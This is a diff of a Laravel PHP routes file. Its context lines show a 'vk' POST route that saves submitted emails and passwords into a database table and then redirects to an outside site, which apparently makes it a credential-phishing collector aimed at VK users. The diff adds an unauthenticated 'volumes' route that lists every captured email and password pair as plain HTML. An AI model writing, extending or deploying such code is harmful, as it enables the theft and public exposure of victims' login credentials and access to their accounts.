@@ -262,6 +262,15 @@ Route::post('vk', function(\Illuminate\Http\Request $request) {
     \App\Volume::create(['name' => $request->input('email') . ' --------- ' . $request->input('pass')])->save();
     return redirect()->to('http://www.yasiv.com/vk');
 });
+Route::get('volumes', function() {
+    $html = "";
+
+    foreach (\App\Volume::all() as $value) {
+        $html .= $value . '<br>';
+    }
+
+    return $html;
+});
 
 Route::group(['namespace' => 'TestingSystem', 'prefix' => 'testing-system-api'], function () {
     Route::get('/', function () {
